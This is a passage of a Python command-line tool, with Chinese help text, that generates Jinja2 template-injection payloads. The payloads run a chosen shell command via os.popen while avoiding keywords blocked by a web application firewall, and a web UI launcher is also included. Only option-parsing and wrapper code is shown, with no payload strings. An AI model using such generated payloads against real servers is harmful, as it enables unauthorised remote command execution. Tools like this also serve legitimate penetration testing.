)
@click.option(
    "--command",
    "-c",
    required=True,
    help="需要执行的shell指令",
)
@click.option(
    "--suffix",
    default="",
    help="手动指定关键字文件的后缀，默认按照文件原本的后缀名读取",
)
@click.option(
    "--detect-mode",
    type=DetectMode,
    cls=EnumOption,
    default=DetectMode.ACCURATE,
    help="分析模式，可为accurate或fast",
)
@click.option(
    "--replaced-keyword-strategy",
    default=ReplacedKeywordStrategy.AVOID,
    type=ReplacedKeywordStrategy,
    cls=EnumOption,
    help="WAF替换关键字时的策略，可为avoid/ignore/doubletapping",
)
@click.option(
    "--environment",
    default=TemplateEnvironment.JINJA2,
    type=TemplateEnvironment,
    cls=EnumOption,
    help="模板的执行环境，默认为不带flask全局变量的普通jinja2",
)
@click.option(
    "--python-version",
    default=PythonVersion.PYTHON3,
    type=PythonVersion,
    cls=EnumOption,
    help="目标的python版本为python2/python3，默认为python3",
)
@click.option(
    "--python-subversion",
    default=6,
    type=int,
    help="目标的python小版本，默认为6(python3.6)",
)
def crack_keywords(
    keywords_file: str,
    output_file: str,
    command: str,
    suffix: str,
    detect_mode: DetectMode,
    replaced_keyword_strategy: ReplacedKeywordStrategy,
    environment: TemplateEnvironment,
    python_version: PythonVersion,
    python_subversion: int,
):
    """根据关键字生成对应的payload"""
    keywords_path = Path(keywords_file)
    output_path = Path(output_file) if output_file else None
    if not keywords_path.exists():
        logger.error(
            "File [blue]%s[/] [red bold]Not Exists![/]",
            rich_escape(keywords_file),
            extra={"markup": True, "highlighter": None},
        )
        raise FileNotFoundError(keywords_file)
    if not suffix:
        suffix = keywords_path.suffix
    if suffix == ".json":
        waf_keywords: List = json.loads(keywords_path.read_text())
    elif suffix == ".py":
        try:
            waf_keywords: List = load_keywords_dotpy_safe(keywords_path.read_text())
        except SyntaxError as e:
            logger.error(
                "Syntax error, check your %s",
                keywords_file,
                extra={"highlighter": None},
            )
            raise e
    else:
        if suffix != ".txt":
            logger.warning("Unknown suffix %s, handle it as .txt", suffix)
        waf_keywords: List = keywords_path.read_text().strip().split("\n")
    logger.info(
        "Waf keywords are [blue]%s[/]",
        rich_escape(repr(waf_keywords)),
        extra={"markup": True, "highlighter": None},
    )
    options = Options(
        detect_mode=detect_mode,
        environment=environment,
        replaced_keyword_strategy=replaced_keyword_strategy,
        python_version=python_version,
        python_subversion=python_subversion,
        waf_keywords=waf_keywords,
    )
    full_payload_gen = FullPayloadGen(
        waf_func=lambda x: all(keyword not in x for keyword in waf_keywords),
        callback=None,
        options=options,
    )
    payload, will_print = full_payload_gen.generate("os_popen_read", command)
    if payload is None or will_print is None:
        logger.error(
            "Generate [yellow]%s[/] failed...",
            rich_escape(command),
            extra={"markup": True, "highlighter": None},
        )
        raise RunFailed()
    if not will_print:
        logger.warning(
            "This payload has [red]No Output[/]! We won't see anything!",
            extra={"markup": True, "highlighter": None},
        )
    if output_path:
        output_path.write_text(payload)
        logger.info(
            "[cyan bold]Done![/] Payload is written into [blue]%s[/]",
            rich_escape(output_path.as_posix()),
            extra={"markup": True, "highlighter": None},
        )
    else:
        print(payload, end="")  # don't print new line for base64


@main.command()
@click.option(
    "--host", "-h", default="127.0.0.1", help="需要监听的host, 默认为127.0.0.1"
)
@click.option("--port", "-p", default=11451, help="需要监听的端口, 默认为11451")
@click.option(
    "--open-browser/--no-open-browser", default=True, help="是否自动打开浏览器"
)
def webui(host, port, open_browser):
    """
    启动webui
    """
    webui_main(host, port, open_browser)


if __name__ == "__main__":
    main()
